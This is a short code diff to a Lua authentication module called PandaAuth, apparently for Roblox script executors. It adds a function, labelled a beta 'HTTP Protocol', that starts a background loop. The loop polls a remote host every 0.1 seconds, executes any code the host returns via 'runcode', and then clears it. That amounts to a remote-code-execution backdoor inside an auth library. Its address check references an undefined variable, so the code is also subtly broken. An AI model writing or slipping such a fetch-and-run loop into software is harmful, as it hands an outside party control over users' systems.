@@ -181,5 +181,35 @@ function PandaAuth:ResetHardwareID(ServiceID, oldKey)
     end
 end
 
+function PandaAuth:SetHTTPProtocol(IPv4)
+warn("HTTP Protocol [ Beta/Unstable ])")
+local No_Execute = "No_Data_Set_Here"
+if ipv4Address == "" or ipv4Address == nil then
+    warn("[Unable to Start HTTP-Protocol] - Missing IP Address / Port")
+    return
+end
+task.spawn(function() 
+    while true do
+        wait(0.1)
+        local content = game:HttpGet(IPv4.."/readcontent")     
+        if content ~= No_Execute then
+            local success, result = pcall(function()
+                runcode(content)
+                local a = tostring(game:HttpGet(IPv4.."/clear"))
+            end)
+    
+            if not success then
+                -- Handle the exception here
+                warn("Error executing loaded code:", result)
+                local b = tostring(game:HttpGet(IPv4.."/clear"))
+            end        
+        end
+    end
+end) 
+end
+
+function PandaAuth:SetWebsocket(IpAddress)
+    print("Hi -> "..tostring(IpAddress))
+end
 
 return PandaAuth
